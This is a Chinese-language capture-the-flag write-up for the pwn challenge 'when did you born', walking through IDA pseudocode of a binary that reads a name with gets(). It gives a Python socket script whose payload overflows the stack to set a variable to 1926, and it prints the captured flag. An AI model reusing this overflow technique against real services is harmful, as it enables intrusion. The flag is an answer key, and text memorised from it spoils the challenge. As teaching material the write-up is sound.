---
title: Pwn - when did you born
description: 攻防世界 | CGCTF | Pwn
---

## 解题思路

- `file`查看附件，是 64 位的 ELF
    ```bash
    $ file 24ac28ef281b4b6caab44d6d52b17491
    24ac28ef281b4b6caab44d6d52b17491: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped
    ```
- 使用 64 位的 IDA Pro 打开，找到`main`转到伪代码
    ```c
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
    __int64 result; // rax
    // 当发生缓冲区溢出时，赋给变量 v4 的值将覆盖变量 v5
    char v4; // [rsp+0h] [rbp-20h]
    unsigned int v5; // [rsp+8h] [rbp-18h]
    // 20h - 18h = 8h
    // 变量 v4 与变量 v5 的栈空间相差 8 个字节
    unsigned __int64 v6; // [rsp+18h] [rbp-8h]

    v6 = __readfsqword(0x28u);
    setbuf(stdin, 0LL);
    setbuf(stdout, 0LL);
    setbuf(stderr, 0LL);
    puts("What's Your Birth?");
    __isoc99_scanf("%d", &v5);
    while ( getchar() != 10 )
        ;
    if ( v5 == 1926 ) // 无法直接通过输入使 v5 的值为 1926
    {
        puts("You Cannot Born In 1926!");
        result = 0LL;
    }
    else
    {
        puts("What's Your Name?");
        gets(&v4);  // gets 不检查输入长度
        printf("You Are Born In %d\n", v5);
        // 目标：通过缓冲区溢出使 v5 的值为 1926
        if ( v5 == 1926 )
        {
        puts("You Shall Have Flag.");
        system("cat flag");
        }
        else
        {
        puts("You Are Naive.");
        puts("You Speed One Second Here.");
        }
        result = 0LL;
    }
    return result;
    }
    ```
- 变量 v4 与变量 v5 的栈空间相差 8 个字节，当`What's Your Name?`提示输入的字符串超过 8 位时，将发生缓冲区溢出。$1926$ 转换为十六进制是`0x0786`（均为不可打印字符），注意使用小端序
    ```py
    import socket, time

    ip = '<server-ip>'
    port = <server-port>

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print(s.recv(1024).decode())
    s.send(b'1\n')  # 任意输入
    time.sleep(0.5)
    print(s.recv(1024).decode())
    s.send(b'11111111\x86\x07\n')
    time.sleep(0.5)
    print(s.recv(1024).decode())
    ```
- 运行 Python 代码，成功获得 Flag
    ```bash
    What's Your Birth?

    What's Your Name?

    You Are Born In 1926
    You Shall Have Flag.
    cyberpeace{82017cc00438da682e8bd4f335c26bee}
    ```